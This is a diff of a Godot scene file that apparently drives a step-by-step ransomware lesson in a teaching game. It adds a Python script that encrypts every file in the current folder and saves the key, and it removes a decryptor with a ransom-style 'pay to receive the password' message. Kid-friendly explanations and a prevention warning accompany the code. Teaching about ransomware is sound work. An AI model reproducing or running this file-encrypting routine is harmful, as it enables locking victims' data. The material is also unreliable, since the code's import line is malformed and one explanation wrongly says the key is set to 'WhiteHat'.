@@ -1,11 +1,11 @@
-[gd_scene load_steps=50 format=3 uid="uid://6yl41qxmeq2t"]
+[gd_scene load_steps=52 format=3 uid="uid://cvlbm3qymf244"]
 
-[ext_resource type="Script" uid="uid://ckfxgu1kkib3k" path="res://Scripts/GUI/code_editor_ui.gd" id="1_1hame"]
-[ext_resource type="FontFile" uid="uid://bbhvwm260bx4g" path="res://Assets/Fonts/avantgarde_demi.ttf" id="2_4njmv"]
-[ext_resource type="FontFile" uid="uid://c4mm3of2mc8o5" path="res://addons/phantom_camera/fonts/Nunito-Black.ttf" id="3_7yavl"]
-[ext_resource type="Script" uid="uid://dymocqk677j5n" path="res://Scripts/GUI/code_edit_window.gd" id="4_nt30g"]
-[ext_resource type="PackedScene" uid="uid://cbqaj2456biy" path="res://Scenes/gui/next_button.tscn" id="5_t7otc"]
-[ext_resource type="PackedScene" uid="uid://cfnlekhp378nk" path="res://Scenes/gui/back_button.tscn" id="6_qn2o3"]
+[ext_resource type="Script" uid="uid://ckfxgu1kkib3k" path="res://Scripts/GUI/code_editor_ui.gd" id="1_8bd8f"]
+[ext_resource type="FontFile" uid="uid://bbhvwm260bx4g" path="res://Assets/Fonts/avantgarde_demi.ttf" id="2_nmigk"]
+[ext_resource type="FontFile" uid="uid://c4mm3of2mc8o5" path="res://addons/phantom_camera/fonts/Nunito-Black.ttf" id="3_vuwby"]
+[ext_resource type="Script" uid="uid://dymocqk677j5n" path="res://Scripts/GUI/code_edit_window.gd" id="4_m28fk"]
+[ext_resource type="PackedScene" uid="uid://cbqaj2456biy" path="res://Scenes/gui/next_button.tscn" id="5_7i6ny"]
+[ext_resource type="PackedScene" uid="uid://cfnlekhp378nk" path="res://Scenes/gui/back_button.tscn" id="6_6g5gb"]
 
 [sub_resource type="StyleBoxFlat" id="StyleBoxFlat_t4n35"]
 content_margin_left = 19.0
@@ -21,7 +21,7 @@ corner_radius_bottom_right = 15
 corner_radius_bottom_left = 15
 
 [sub_resource type="FontVariation" id="FontVariation_h8m8q"]
-base_font = ExtResource("3_7yavl")
+base_font = ExtResource("3_vuwby")
 
 [sub_resource type="DPITexture" id="DPITexture_pkbn6"]
 _source = "<svg xmlns=\"http://www.w3.org/2000/svg\" width=\"16\" height=\"16\"><path fill=\"none\" stroke=\"#b2b2b2\" stroke-linecap=\"round\" stroke-linejoin=\"round\" stroke-opacity=\".45\" stroke-width=\"2\" d=\"m5 7 3 3 3-3\"/></svg>
@@ -52,7 +52,7 @@ _source = "<svg xmlns=\"http://www.w3.org/2000/svg\" width=\"16\" height=\"16\">
 [sub_resource type="StyleBoxEmpty" id="StyleBoxEmpty_de0th"]
 
 [sub_resource type="FontVariation" id="FontVariation_31cwg"]
-base_font = ExtResource("3_7yavl")
+base_font = ExtResource("3_vuwby")
 
 [sub_resource type="Theme" id="Theme_x5n46"]
 FoldableContainer/colors/collapsed_font_color = Color(1, 1, 1, 1)
@@ -139,7 +139,29 @@ tracks/0/keys = {
 "times": PackedFloat32Array(0),
 "transitions": PackedFloat32Array(1),
 "update": 1,
-"values": [""]
+"values": ["import os from cryptography.fernet 
+import fernet
+
+allfiles = [ ]
+for file in os.listdir():
+	if file == 'malware.py' or file == 'key.key' or file == ' decr.py':
+		continue
+	if os.path.isfile(file):
+		allfiles.append(file)
+print (allfiles)
+
+key = Fernet.generate_key()
+with open ('key.key', 'wb') as thekey: 
+	thekey.write(key)
+
+for file in allfiles:
+	with open(file, 'rb') as thefile:
+		content = thefile.read()
+	content_encryp = Fernet(key).encrypt(content)
+	with open(file, 'wb') as thefile: 
+		thefile.write(content_encryp)
+
+print('All your files have been encrypted')"]
 }
 tracks/1/type = "value"
 tracks/1/imported = false
@@ -151,7 +173,7 @@ tracks/1/keys = {
 "times": PackedFloat32Array(0),
 "transitions": PackedFloat32Array(1),
 "update": 1,
-"values": [true]
+"values": [false]
 }
 tracks/2/type = "value"
 tracks/2/imported = false
@@ -163,7 +185,7 @@ tracks/2/keys = {
 "times": PackedFloat32Array(0),
 "transitions": PackedFloat32Array(1),
 "update": 1,
-"values": [""]
+"values": ["Ransomware is one of the most dangerous types of malicious software. Once it infects your computer, it locks or encrypts your files so you cannot open them. To protect yourself from ransomware, always back up your files, keep your system updated, use strong security tools, and be careful with emails and links, because prevention is much easier than fixing the damage."]
 }
 tracks/3/type = "value"
 tracks/3/imported = false
@@ -175,7 +197,7 @@ tracks/3/keys = {
 "times": PackedFloat32Array(0),
 "transitions": PackedFloat32Array(1),
 "update": 1,
-"values": ["Creating an encryption code"]
+"values": ["⚠️RANSOMWARE ALERT⚠️"]
 }
 tracks/4/type = "value"
 tracks/4/imported = false
@@ -274,33 +296,29 @@ tracks/0/keys = {
 "times": PackedFloat32Array(0),
 "transitions": PackedFloat32Array(1),
 "update": 1,
-"values": ["import os from cryptography.fernet
+"values": ["import os from cryptography.fernet 
 import fernet
 
-allfiles = []
+allfiles = [ ]
 for file in os.listdir():
-	if file == 'malware.py' or file == 'key.key' or file == 'decr.py':
+	if file == 'malware.py' or file == 'key.key' or file == ' decr.py':
 		continue
 	if os.path.isfile(file):
 		allfiles.append(file)
+print (allfiles)
 
-print(allfiles)
+key = Fernet.generate_key()
+with open ('key.key', 'wb') as thekey: 
+	thekey.write(key)
 
-with open('key.key', 'rb') as key:
-		password = key.read()
-passphrase = 'WhiteHat'
-userpass = input('Enter the password you received from us:')
+for file in allfiles:
+	with open(file, 'rb') as thefile:
+		content = thefile.read()
+	content_encryp = Fernet(key).encrypt(content)
+	with open(file, 'wb') as thefile: 
+		thefile.write(content_encryp)
 
-if userpass == passphrase:
-	for file in allfiles:
-		with open(file, 'rb') as thefile:
-			 contents = thefile.read()
-		content_decr = Fernet(password).decrypt(contents)
-		with open(file, 'wb') as thefile:
- 			thefile.write(content_decr)
-		print(\"You got your files back\")
-else: 
-        print (\"Wrong password! Pay to receive the right password\")"]
+print('All your files have been encrypted')"]
 }
 tracks/1/type = "value"
 tracks/1/imported = false
@@ -324,9 +342,13 @@ tracks/2/keys = {
 "times": PackedFloat32Array(0),
 "transitions": PackedFloat32Array(1),
 "update": 1,
-"values": ["At the very beginning, the program brings in some tools it needs to work. The ”os” tool helps it look around in folders and find files, kind of like a file explorer. The Fernet tool (from cryptography) is the one that actually locks and unlocks the files safely.
+"values": ["First, the program imports two important tools:
+1. The os module in Python is like a toolbox that helps your program “talk” to your computer. It can:
 
-In short: os is the organizer, and Fernet is the lock-and-key system."]
+- Look inside folders to see what’s there.
+- Check if something is a file or a folder.
+- Move around between different folders.
+- Work with file paths (the addresses of files on your computer)."]
 }
 tracks/3/type = "value"
 tracks/3/imported = false
@@ -350,7 +372,7 @@ tracks/4/keys = {
 "times": PackedFloat32Array(0),
 "transitions": PackedFloat32Array(1),
 "update": 0,
-"values": [Vector2(0.1, 0.135)]
+"values": [Vector2(0.135, 0.135)]
 }
 tracks/5/type = "value"
 tracks/5/imported = false
@@ -362,7 +384,7 @@ tracks/5/keys = {
 "times": PackedFloat32Array(0),
 "transitions": PackedFloat32Array(1),
 "update": 0,
-"values": [Vector2(3.025, 0.565)]
+"values": [Vector2(3.025, 0.26)]
 }
 tracks/6/type = "value"
 tracks/6/imported = false
@@ -389,33 +411,29 @@ tracks/0/keys = {
 "times": PackedFloat32Array(0),
 "transitions": PackedFloat32Array(1),
 "update": 1,
-"values": ["import os from cryptography.fernet
+"values": ["import os from cryptography.fernet 
 import fernet
 
-allfiles = []
+allfiles = [ ]
 for file in os.listdir():
-	if file == 'malware.py' or file == 'key.key' or file == 'decr.py':
+	if file == 'malware.py' or file == 'key.key' or file == ' decr.py':
 		continue
 	if os.path.isfile(file):
 		allfiles.append(file)
+print (allfiles)
 
-print(allfiles)
+key = Fernet.generate_key()
+with open ('key.key', 'wb') as thekey: 
+	thekey.write(key)
 
-with open('key.key', 'rb') as key:
-		password = key.read()
-passphrase = 'WhiteHat'
-userpass = input('Enter the password you received from us:')
+for file in allfiles:
+	with open(file, 'rb') as thefile:
+		content = thefile.read()
+	content_encryp = Fernet(key).encrypt(content)
+	with open(file, 'wb') as thefile: 
+		thefile.write(content_encryp)
 
-if userpass == passphrase:
-	for file in allfiles:
-		with open(file, 'rb') as thefile:
-			 contents = thefile.read()
-		content_decr = Fernet(password).decrypt(contents)
-		with open(file, 'wb') as thefile:
- 			thefile.write(content_decr)
-		print(\"You got your files back\")
-else: 
-        print (\"Wrong password! Pay to receive the right password\")"]
+print('All your files have been encrypted')"]
 }
 tracks/1/type = "value"
 tracks/1/imported = false
@@ -439,7 +457,11 @@ tracks/2/keys = {
 "times": PackedFloat32Array(0),
 "transitions": PackedFloat32Array(1),
 "update": 1,
-"values": ["In this part, the program is just making a list of files that it will later try to unlock. It looks at every file in the current folder, but intentionally ignores three special files (malware.py, key.key, and decr.py) so it won’t touch the program itself, the secret key, or the decryption tool. For each thing it finds, it checks “Is this a real file or just a folder?” — only real files are added to the allfiles[] list. At the end it prints that list so you can see exactly which files were chosen."]
+"values": ["2. The Fernet system is like a super-secure lockbox .You put your message (data) inside it.
+
+Fernet locks it up with a special key so nobody else can peek inside.Later, if you have the same key, you can unlock it and get the original message back.
+
+So, it’s basically a way to hide information so only the right person with the key can see it."]
 }
 tracks/3/type = "value"
 tracks/3/imported = false
@@ -451,7 +473,7 @@ tracks/3/keys = {
 "times": PackedFloat32Array(0),
 "transitions": PackedFloat32Array(1),
 "update": 1,
-"values": ["Collecting Files to Encrypt"]
+"values": ["Importing the Tools"]
 }
 tracks/4/type = "value"
 tracks/4/imported = false
@@ -463,7 +485,7 @@ tracks/4/keys = {
 "times": PackedFloat32Array(0),
 "transitions": PackedFloat32Array(1),
 "update": 0,
-"values": [Vector2(0.1, 1.06)]
+"values": [Vector2(0.135, 0.45)]
 }
 tracks/5/type = "value"
 tracks/5/imported = false
@@ -475,7 +497,7 @@ tracks/5/keys = {
 "times": PackedFloat32Array(0),
 "transitions": PackedFloat32Array(1),
 "update": 0,
-"values": [Vector2(3.675, 2.78)]
+"values": [Vector2(3.025, 0.26)]
 }
 tracks/6/type = "value"
 tracks/6/imported = false
@@ -502,33 +524,29 @@ tracks/0/keys = {
 "times": PackedFloat32Array(0),
 "transitions": PackedFloat32Array(1),
 "update": 1,
-"values": ["import os from cryptography.fernet
+"values": ["import os from cryptography.fernet 
 import fernet
 
-allfiles = []
+allfiles = [ ]
 for file in os.listdir():
-	if file == 'malware.py' or file == 'key.key' or file == 'decr.py':
+	if file == 'malware.py' or file == 'key.key' or file == ' decr.py':
 		continue
 	if os.path.isfile(file):
 		allfiles.append(file)
+print (allfiles)
 
-print(allfiles)
+key = Fernet.generate_key()
+with open ('key.key', 'wb') as thekey: 
+	thekey.write(key)
 
-with open('key.key', 'rb') as key:
-		password = key.read()
-passphrase = 'WhiteHat'
-userpass = input('Enter the password you received from us:')
+for file in allfiles:
+	with open(file, 'rb') as thefile:
+		content = thefile.read()
+	content_encryp = Fernet(key).encrypt(content)
+	with open(file, 'wb') as thefile: 
+		thefile.write(content_encryp)
 
-if userpass == passphrase:
-	for file in allfiles:
-		with open(file, 'rb') as thefile:
-			 contents = thefile.read()
-		content_decr = Fernet(password).decrypt(contents)
-		with open(file, 'wb') as thefile:
- 			thefile.write(content_decr)
-		print(\"You got your files back\")
-else: 
-        print (\"Wrong password! Pay to receive the right password\")"]
+print('All your files have been encrypted')"]
 }
 tracks/1/type = "value"
 tracks/1/imported = false
@@ -552,7 +570,9 @@ tracks/2/keys = {
 "times": PackedFloat32Array(0),
 "transitions": PackedFloat32Array(1),
 "update": 1,
-"values": ["The program opens a file called key.key and reads what’s inside. That file holds the secret Fernet key, which is basically the password needed to unlock all the scrambled files. Without it, the program wouldn’t be able to turn the data back into its original form."]
+"values": ["The program prepares a list of files to be encrypted:
+
+- It starts with an empty list called allfiles."]
 }
 tracks/3/type = "value"
 tracks/3/imported = false
@@ -564,7 +584,7 @@ tracks/3/keys = {
 "times": PackedFloat32Array(0),
 "transitions": PackedFloat32Array(1),
 "update": 1,
-"values": ["Loading the Password key"]
+"values": ["Collecting Files to Encrypt"]
 }
 tracks/4/type = "value"
 tracks/4/imported = false
@@ -576,120 +596,7 @@ tracks/4/keys = {
 "times": PackedFloat32Array(0),
 "transitions": PackedFloat32Array(1),
 "update": 0,
-"values": [Vector2(0.1, 0.105)]
-}
-tracks/5/type = "value"
-tracks/5/imported = false
-tracks/5/enabled = true
-tracks/5/path = NodePath("Body/CodeContainer/PanelContainer/Overlay:material:shader_parameter/hole_size")
-tracks/5/interp = 1
-tracks/5/loop_wrap = true
-tracks/5/keys = {
-"times": PackedFloat32Array(0),
-"transitions": PackedFloat32Array(1),
-"update": 0,
-"values": [Vector2(3.025, 0.62)]
-}
-tracks/6/type = "value"
-tracks/6/imported = false
-tracks/6/enabled = true
-tracks/6/path = NodePath("Body/CodeContainer/PanelContainer/MarginContainer/CodeEdit:scroll_vertical")
-tracks/6/interp = 1
-tracks/6/loop_wrap = true
-tracks/6/keys = {
-"times": PackedFloat32Array(0),
-"transitions": PackedFloat32Array(1),
-"update": 0,
-"values": [13.0]
-}
-
-[sub_resource type="Animation" id="Animation_cxtjw"]
-resource_name = "ransomware_step_04"
-tracks/0/type = "value"
-tracks/0/imported = false
-tracks/0/enabled = true
-tracks/0/path = NodePath("Body/CodeContainer/PanelContainer/MarginContainer/CodeEdit:text")
-tracks/0/interp = 1
-tracks/0/loop_wrap = true
-tracks/0/keys = {
-"times": PackedFloat32Array(0),
-"transitions": PackedFloat32Array(1),
-"update": 1,
-"values": ["import os from cryptography.fernet
-import fernet
-
-allfiles = []
-for file in os.listdir():
-	if file == 'malware.py' or file == 'key.key' or file == 'decr.py':
-		continue
-	if os.path.isfile(file):
-		allfiles.append(file)
-
-print(allfiles)
-
-with open('key.key', 'rb') as key:
-		password = key.read()
-passphrase = 'WhiteHat'
-userpass = input('Enter the password you received from us:')
-
-if userpass == passphrase:
-	for file in allfiles:
-		with open(file, 'rb') as thefile:
-			 contents = thefile.read()
-		content_decr = Fernet(password).decrypt(contents)
-		with open(file, 'wb') as thefile:
- 			thefile.write(content_decr)
-		print(\"You got your files back\")
-else: 
-        print (\"Wrong password! Pay to receive the right password\")"]
-}
-tracks/1/type = "value"
-tracks/1/imported = false
-tracks/1/enabled = true
-tracks/1/path = NodePath("Body/CodeContainer/PanelContainer/Overlay:visible")
-tracks/1/interp = 1
-tracks/1/loop_wrap = true
-tracks/1/keys = {
-"times": PackedFloat32Array(0),
-"transitions": PackedFloat32Array(1),
-"update": 1,
-"values": [true]
-}
-tracks/2/type = "value"
-tracks/2/imported = false
-tracks/2/enabled = true
-tracks/2/path = NodePath("Body/ExplanationPanel/VBoxContainer/FoldableContainer/RichTextLabel:text")
-tracks/2/interp = 1
-tracks/2/loop_wrap = true
-tracks/2/keys = {
-"times": PackedFloat32Array(0),
-"transitions": PackedFloat32Array(1),
-"update": 1,
-"values": ["Next, the program sets a password inside the code itself, called the passphrase \"WhiteHat\""]
-}
-tracks/3/type = "value"
-tracks/3/imported = false
-tracks/3/enabled = true
-tracks/3/path = NodePath("Body/ExplanationPanel/VBoxContainer/FoldableContainer:title")
-tracks/3/interp = 1
-tracks/3/loop_wrap = true
-tracks/3/keys = {
-"times": PackedFloat32Array(0),
-"transitions": PackedFloat32Array(1),
-"update": 1,
-"values": ["Decryption Password"]
-}
-tracks/4/type = "value"
-tracks/4/imported = false
-tracks/4/enabled = true
-tracks/4/path = NodePath("Body/CodeContainer/PanelContainer/Overlay:material:shader_parameter/hole_position")
-tracks/4/interp = 1
-tracks/4/loop_wrap = true
-tracks/4/keys = {
-"times": PackedFloat32Array(0),
-"transitions": PackedFloat32Array(1),
-"update": 0,
-"values": [Vector2(0.1, 0.75)]
+"values": [Vector2(0.1, 1.07)]
 }
 tracks/5/type = "value"
 tracks/5/imported = false
@@ -713,7 +620,116 @@ tracks/6/keys = {
 "times": PackedFloat32Array(0),
 "transitions": PackedFloat32Array(1),
 "update": 0,
-"values": [13.0]
+"values": [0.0]
+}
+
+[sub_resource type="Animation" id="Animation_cxtjw"]
+resource_name = "ransomware_step_04"
+tracks/0/type = "value"
+tracks/0/imported = false
+tracks/0/enabled = true
+tracks/0/path = NodePath("Body/CodeContainer/PanelContainer/MarginContainer/CodeEdit:text")
+tracks/0/interp = 1
+tracks/0/loop_wrap = true
+tracks/0/keys = {
+"times": PackedFloat32Array(0),
+"transitions": PackedFloat32Array(1),
+"update": 1,
+"values": ["import os from cryptography.fernet 
+import fernet
+
+allfiles = [ ]
+for file in os.listdir():
+	if file == 'malware.py' or file == 'key.key' or file == ' decr.py':
+		continue
+	if os.path.isfile(file):
+		allfiles.append(file)
+print (allfiles)
+
+key = Fernet.generate_key()
+with open ('key.key', 'wb') as thekey: 
+	thekey.write(key)
+
+for file in allfiles:
+	with open(file, 'rb') as thefile:
+		content = thefile.read()
+	content_encryp = Fernet(key).encrypt(content)
+	with open(file, 'wb') as thefile: 
+		thefile.write(content_encryp)
+
+print('All your files have been encrypted')"]
+}
+tracks/1/type = "value"
+tracks/1/imported = false
+tracks/1/enabled = true
+tracks/1/path = NodePath("Body/CodeContainer/PanelContainer/Overlay:visible")
+tracks/1/interp = 1
+tracks/1/loop_wrap = true
+tracks/1/keys = {
+"times": PackedFloat32Array(0),
+"transitions": PackedFloat32Array(1),
+"update": 1,
+"values": [true]
+}
+tracks/2/type = "value"
+tracks/2/imported = false
+tracks/2/enabled = true
+tracks/2/path = NodePath("Body/ExplanationPanel/VBoxContainer/FoldableContainer/RichTextLabel:text")
+tracks/2/interp = 1
+tracks/2/loop_wrap = true
+tracks/2/keys = {
+"times": PackedFloat32Array(0),
+"transitions": PackedFloat32Array(1),
+"update": 1,
+"values": ["Then, it looks through file in the current directory using os.listdir(). It’s like you start with an empty bag, then look around the room to see what items (files and folders) are there."]
+}
+tracks/3/type = "value"
+tracks/3/imported = false
+tracks/3/enabled = true
+tracks/3/path = NodePath("Body/ExplanationPanel/VBoxContainer/FoldableContainer:title")
+tracks/3/interp = 1
+tracks/3/loop_wrap = true
+tracks/3/keys = {
+"times": PackedFloat32Array(0),
+"transitions": PackedFloat32Array(1),
+"update": 1,
+"values": ["Collecting Files"]
+}
+tracks/4/type = "value"
+tracks/4/imported = false
+tracks/4/enabled = true
+tracks/4/path = NodePath("Body/CodeContainer/PanelContainer/Overlay:material:shader_parameter/hole_position")
+tracks/4/interp = 1
+tracks/4/loop_wrap = true
+tracks/4/keys = {
+"times": PackedFloat32Array(0),
+"transitions": PackedFloat32Array(1),
+"update": 0,
+"values": [Vector2(0.135, 1.375)]
+}
+tracks/5/type = "value"
+tracks/5/imported = false
+tracks/5/enabled = true
+tracks/5/path = NodePath("Body/CodeContainer/PanelContainer/Overlay:material:shader_parameter/hole_size")
+tracks/5/interp = 1
+tracks/5/loop_wrap = true
+tracks/5/keys = {
+"times": PackedFloat32Array(0),
+"transitions": PackedFloat32Array(1),
+"update": 0,
+"values": [Vector2(3.025, 0.26)]
+}
+tracks/6/type = "value"
+tracks/6/imported = false
+tracks/6/enabled = true
+tracks/6/path = NodePath("Body/CodeContainer/PanelContainer/MarginContainer/CodeEdit:scroll_vertical")
+tracks/6/interp = 1
+tracks/6/loop_wrap = true
+tracks/6/keys = {
+"times": PackedFloat32Array(0),
+"transitions": PackedFloat32Array(1),
+"update": 0,
+"values": [0.0]
 }
 
 [sub_resource type="Animation" id="Animation_wf7ls"]
@@ -728,33 +744,29 @@ tracks/0/keys = {
 "times": PackedFloat32Array(0),
 "transitions": PackedFloat32Array(1),
 "update": 1,
-"values": ["import os from cryptography.fernet
+"values": ["import os from cryptography.fernet 
 import fernet
 
-allfiles = []
+allfiles = [ ]
 for file in os.listdir():
-	if file == 'malware.py' or file == 'key.key' or file == 'decr.py':
+	if file == 'malware.py' or file == 'key.key' or file == ' decr.py':
 		continue
 	if os.path.isfile(file):
 		allfiles.append(file)
+print (allfiles)
 
-print(allfiles)
+key = Fernet.generate_key()
+with open ('key.key', 'wb') as thekey: 
+	thekey.write(key)
 
-with open('key.key', 'rb') as key:
-		password = key.read()
-passphrase = 'WhiteHat'
-userpass = input('Enter the password you received from us:')
+for file in allfiles:
+	with open(file, 'rb') as thefile:
+		content = thefile.read()
+	content_encryp = Fernet(key).encrypt(content)
+	with open(file, 'wb') as thefile: 
+		thefile.write(content_encryp)
 
-if userpass == passphrase:
-	for file in allfiles:
-		with open(file, 'rb') as thefile:
-			 contents = thefile.read()
-		content_decr = Fernet(password).decrypt(contents)
-		with open(file, 'wb') as thefile:
- 			thefile.write(content_decr)
-		print(\"You got your files back\")
-else: 
-        print (\"Wrong password! Pay to receive the right password\")"]
+print('All your files have been encrypted')"]
 }
 tracks/1/type = "value"
 tracks/1/imported = false
@@ -778,7 +790,13 @@ tracks/2/keys = {
 "times": PackedFloat32Array(0),
 "transitions": PackedFloat32Array(1),
 "update": 1,
-"values": ["The program then asks the user to type in the password they were given. This works like a security guard at the door — even if someone managed to steal the real key file (key.key), they still can’t get in unless they also know the secret password."]
+"values": ["Some files are deliberately ignored so the program doesn’t mess itself up:
+
+- It skips the program’s own file (malware.py), so it doesn’t accidentally lock itself.
+- It skips the key file (key.key), because if that gets locked, there’s no way to unlock anything.
+- It skips the decryption script (decr.py), since that’s needed later to undo the lock.
+
+In simple term: The program avoids locking the very tools it needs to work, kind of like a person hiding valuables but keeping the  key outside the safe so they can still open it later."]
 }
 tracks/3/type = "value"
 tracks/3/imported = false
@@ -790,7 +808,7 @@ tracks/3/keys = {
 "times": PackedFloat32Array(0),
 "transitions": PackedFloat32Array(1),
 "update": 1,
-"values": ["Ask for the Passphrase"]
+"values": ["Collecting Files"]
 }
 tracks/4/type = "value"
 tracks/4/imported = false
@@ -802,7 +820,7 @@ tracks/4/keys = {
 "times": PackedFloat32Array(0),
 "transitions": PackedFloat32Array(1),
 "update": 0,
-"values": [Vector2(0.1, 1.065)]
+"values": [Vector2(0.1, 1.375)]
 }
 tracks/5/type = "value"
 tracks/5/imported = false
@@ -814,7 +832,7 @@ tracks/5/keys = {
 "times": PackedFloat32Array(0),
 "transitions": PackedFloat32Array(1),
 "update": 0,
-"values": [Vector2(3.77, 0.555)]
+"values": [Vector2(3.77, 1.16)]
 }
 tracks/6/type = "value"
 tracks/6/imported = false
@@ -826,7 +844,7 @@ tracks/6/keys = {
 "times": PackedFloat32Array(0),
 "transitions": PackedFloat32Array(1),
 "update": 0,
-"values": [13.0]
+"values": [0.0]
 }
 
 [sub_resource type="Animation" id="Animation_vuf0p"]
@@ -841,33 +859,29 @@ tracks/0/keys = {
 "times": PackedFloat32Array(0),
 "transitions": PackedFloat32Array(1),
 "update": 1,
-"values": ["import os from cryptography.fernet
+"values": ["import os from cryptography.fernet 
 import fernet
 
-allfiles = []
+allfiles = [ ]
 for file in os.listdir():
-	if file == 'malware.py' or file == 'key.key' or file == 'decr.py':
+	if file == 'malware.py' or file == 'key.key' or file == ' decr.py':
 		continue
 	if os.path.isfile(file):
 		allfiles.append(file)
+print (allfiles)
 
-print(allfiles)
+key = Fernet.generate_key()
+with open ('key.key', 'wb') as thekey: 
+	thekey.write(key)
 
-with open('key.key', 'rb') as key:
-		password = key.read()
-passphrase = 'WhiteHat'
-userpass = input('Enter the password you received from us:')
+for file in allfiles:
+	with open(file, 'rb') as thefile:
+		content = thefile.read()
+	content_encryp = Fernet(key).encrypt(content)
+	with open(file, 'wb') as thefile: 
+		thefile.write(content_encryp)
 
-if userpass == passphrase:
-	for file in allfiles:
-		with open(file, 'rb') as thefile:
-			 contents = thefile.read()
-		content_decr = Fernet(password).decrypt(contents)
-		with open(file, 'wb') as thefile:
- 			thefile.write(content_decr)
-		print(\"You got your files back\")
-else: 
-        print (\"Wrong password! Pay to receive the right password\")"]
+print('All your files have been encrypted')"]
 }
 tracks/1/type = "value"
 tracks/1/imported = false
@@ -891,7 +905,7 @@ tracks/2/keys = {
 "times": PackedFloat32Array(0),
 "transitions": PackedFloat32Array(1),
 "update": 1,
-"values": ["If the user types the correct passphrase, the decyption program begins the real work"]
+"values": ["If an file is confirmed to be an actual file (not a folder), it is added to the list \"allfiles[]\"."]
 }
 tracks/3/type = "value"
 tracks/3/imported = false
@@ -903,7 +917,7 @@ tracks/3/keys = {
 "times": PackedFloat32Array(0),
 "transitions": PackedFloat32Array(1),
 "update": 1,
-"values": ["Decrypt the Files"]
+"values": ["Collecting Files"]
 }
 tracks/4/type = "value"
 tracks/4/imported = false
@@ -915,7 +929,7 @@ tracks/4/keys = {
 "times": PackedFloat32Array(0),
 "transitions": PackedFloat32Array(1),
 "update": 0,
-"values": [Vector2(0.1, 0.12)]
+"values": [Vector2(0.135, 2.635)]
 }
 tracks/5/type = "value"
 tracks/5/imported = false
@@ -927,7 +941,7 @@ tracks/5/keys = {
 "times": PackedFloat32Array(0),
 "transitions": PackedFloat32Array(1),
 "update": 0,
-"values": [Vector2(3.735, 0.31)]
+"values": [Vector2(3.735, 0.625)]
 }
 tracks/6/type = "value"
 tracks/6/imported = false
@@ -939,7 +953,7 @@ tracks/6/keys = {
 "times": PackedFloat32Array(0),
 "transitions": PackedFloat32Array(1),
 "update": 0,
-"values": [19.0]
+"values": [0.0]
 }
 
 [sub_resource type="Animation" id="Animation_gu46y"]
@@ -954,33 +968,29 @@ tracks/0/keys = {
 "times": PackedFloat32Array(0),
 "transitions": PackedFloat32Array(1),
 "update": 1,
-"values": ["import os from cryptography.fernet
+"values": ["import os from cryptography.fernet 
 import fernet
 
-allfiles = []
+allfiles = [ ]
 for file in os.listdir():
-	if file == 'malware.py' or file == 'key.key' or file == 'decr.py':
+	if file == 'malware.py' or file == 'key.key' or file == ' decr.py':
 		continue
 	if os.path.isfile(file):
 		allfiles.append(file)
+print (allfiles)
 
-print(allfiles)
+key = Fernet.generate_key()
+with open ('key.key', 'wb') as thekey: 
+	thekey.write(key)
 
-with open('key.key', 'rb') as key:
-		password = key.read()
-passphrase = 'WhiteHat'
-userpass = input('Enter the password you received from us:')
+for file in allfiles:
+	with open(file, 'rb') as thefile:
+		content = thefile.read()
+	content_encryp = Fernet(key).encrypt(content)
+	with open(file, 'wb') as thefile: 
+		thefile.write(content_encryp)
 
-if userpass == passphrase:
-	for file in allfiles:
-		with open(file, 'rb') as thefile:
-			 contents = thefile.read()
-		content_decr = Fernet(password).decrypt(contents)
-		with open(file, 'wb') as thefile:
- 			thefile.write(content_decr)
-		print(\"You got your files back\")
-else: 
-        print (\"Wrong password! Pay to receive the right password\")"]
+print('All your files have been encrypted')"]
 }
 tracks/1/type = "value"
 tracks/1/imported = false
@@ -1004,7 +1014,7 @@ tracks/2/keys = {
 "times": PackedFloat32Array(0),
 "transitions": PackedFloat32Array(1),
 "update": 1,
-"values": [" It opens each encrypted file and reads the scrambled data inside."]
+"values": ["Finally, the list is printed out so we can see which files are going to be encrypted."]
 }
 tracks/3/type = "value"
 tracks/3/imported = false
@@ -1016,7 +1026,7 @@ tracks/3/keys = {
 "times": PackedFloat32Array(0),
 "transitions": PackedFloat32Array(1),
 "update": 1,
-"values": ["Decrypt the Files"]
+"values": ["Collecting Files"]
 }
 tracks/4/type = "value"
 tracks/4/imported = false
@@ -1028,7 +1038,7 @@ tracks/4/keys = {
 "times": PackedFloat32Array(0),
 "transitions": PackedFloat32Array(1),
 "update": 0,
-"values": [Vector2(0.1, 0.435)]
+"values": [Vector2(0.135, 3.22)]
 }
 tracks/5/type = "value"
 tracks/5/imported = false
@@ -1040,7 +1050,7 @@ tracks/5/keys = {
 "times": PackedFloat32Array(0),
 "transitions": PackedFloat32Array(1),
 "update": 0,
-"values": [Vector2(3.735, 0.93)]
+"values": [Vector2(3.735, 0.315)]
 }
 tracks/6/type = "value"
 tracks/6/imported = false
@@ -1052,7 +1062,7 @@ tracks/6/keys = {
 "times": PackedFloat32Array(0),
 "transitions": PackedFloat32Array(1),
 "update": 0,
-"values": [19.0]
+"values": [0.0]
 }
 
 [sub_resource type="Animation" id="Animation_de0th"]
@@ -1067,33 +1077,29 @@ tracks/0/keys = {
 "times": PackedFloat32Array(0),
 "transitions": PackedFloat32Array(1),
 "update": 1,
-"values": ["import os from cryptography.fernet
+"values": ["import os from cryptography.fernet 
 import fernet
 
-allfiles = []
+allfiles = [ ]
 for file in os.listdir():
-	if file == 'malware.py' or file == 'key.key' or file == 'decr.py':
+	if file == 'malware.py' or file == 'key.key' or file == ' decr.py':
 		continue
 	if os.path.isfile(file):
 		allfiles.append(file)
+print (allfiles)
 
-print(allfiles)
+key = Fernet.generate_key()
+with open ('key.key', 'wb') as thekey: 
+	thekey.write(key)
 
-with open('key.key', 'rb') as key:
-		password = key.read()
-passphrase = 'WhiteHat'
-userpass = input('Enter the password you received from us:')
+for file in allfiles:
+	with open(file, 'rb') as thefile:
+		content = thefile.read()
+	content_encryp = Fernet(key).encrypt(content)
+	with open(file, 'wb') as thefile: 
+		thefile.write(content_encryp)
 
-if userpass == passphrase:
-	for file in allfiles:
-		with open(file, 'rb') as thefile:
-			 contents = thefile.read()
-		content_decr = Fernet(password).decrypt(contents)
-		with open(file, 'wb') as thefile:
- 			thefile.write(content_decr)
-		print(\"You got your files back\")
-else: 
-        print (\"Wrong password! Pay to receive the right password\")"]
+print('All your files have been encrypted')"]
 }
 tracks/1/type = "value"
 tracks/1/imported = false
@@ -1117,7 +1123,11 @@ tracks/2/keys = {
 "times": PackedFloat32Array(0),
 "transitions": PackedFloat32Array(1),
 "update": 1,
-"values": ["It uses the Fernet key to decrypt (or “unscramble”) that data."]
+"values": ["The program creates a special secret key (like a password) using Fernet.generate_key(). Normally, it’s a bunch of random characters, but here it’s set to \"WhiteHat\".
+
